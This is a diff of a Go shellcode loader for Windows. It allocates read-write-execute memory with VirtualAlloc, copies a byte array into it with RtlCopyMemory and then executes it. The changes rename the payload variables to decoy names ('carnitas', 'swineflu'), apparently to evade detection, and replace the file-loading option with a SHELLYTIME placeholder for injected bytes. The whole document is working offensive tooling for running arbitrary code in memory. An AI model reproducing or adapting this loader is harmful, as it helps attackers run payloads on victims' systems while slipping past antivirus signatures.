@@ -1,7 +1,7 @@
 package main
 
 import (
-	"io/ioutil"
+	
 	"os"
 	"syscall"
 	"unsafe"
@@ -20,7 +20,7 @@ var (
 	ntdll          = syscall.MustLoadDLL("ntdll.dll")
 	VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
 	RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
-	shellcode_calc = []byte{SHELLYTIME}
+	carnitas = []byte{SHELLYTIME}
 )
 
 func checkErr(err error) {
@@ -106,18 +106,14 @@ var j interface{}
 	} else {
 		fmt.Println(err)
 	}
-	shellcode := shellcode_calc
-	if len(os.Args) > 1 {
-		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
-		checkErr(err)
-		shellcode = shellcodeFileData
-	}
+	swineflu := carnitas
+	
 
-	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(swineflu)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
 		checkErr(err)
 	}
-	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&swineflu[0])), uintptr(len(swineflu)))
 	checkErr(err)
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
